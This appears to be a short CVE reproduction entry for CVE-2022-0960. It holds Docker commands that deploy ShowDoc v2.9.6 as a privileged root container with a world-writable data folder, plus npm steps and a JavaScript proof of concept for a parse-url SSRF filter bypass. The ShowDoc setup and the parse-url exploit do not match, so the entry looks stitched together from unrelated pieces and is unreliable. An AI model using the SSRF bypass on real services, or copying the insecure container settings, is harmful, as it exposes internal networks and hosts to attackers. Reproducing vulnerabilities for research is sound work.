### CVE-2022-0960

### PoC Links
[Huntr.dev](https://huntr.dev/bounties/462cd8a7-b1a9-4e93-af71-b56ba1d7ad4e/)

### Docker Container Run Command
```shell
#
docker pull star7th/showdoc:v2.9.6
#
mkdir -p /showdoc_data/html
chmod  -R 777 /showdoc_data
#
docker run -d --name showdoc --user=root --privileged=true -p 4999:80 \
-v /showdoc_data/html:/var/www/html/ star7th/showdoc:v2.9.6
#
```

### PoC Reproduce Command
```shell
cd /poc
# Install Vulnerable Dependence
npm init -y
npm install --save parse-url@7.0.0
# Run poc.js
node poc.js
```

### Description
可以观察到url解析错误，解析出来的属性错误，可能会触发SSRF漏洞等，例如：
```javascript
import parseUrl from "parse-url";
import fetch from 'node-fetch';

var parsed = parseUrl("http://nnnn@localhost:808:/?id=xss")
// SSRF，会访问到 http://nnnn@localhost/808  (跳转)-->  http://localhost/808
if (parsed.resource == "localhost") {
    console.log("internal network access is blocked")
} else {
    const response = await fetch('http://' + parsed.resource + parsed.pathname);
    console.log(response)
}
```



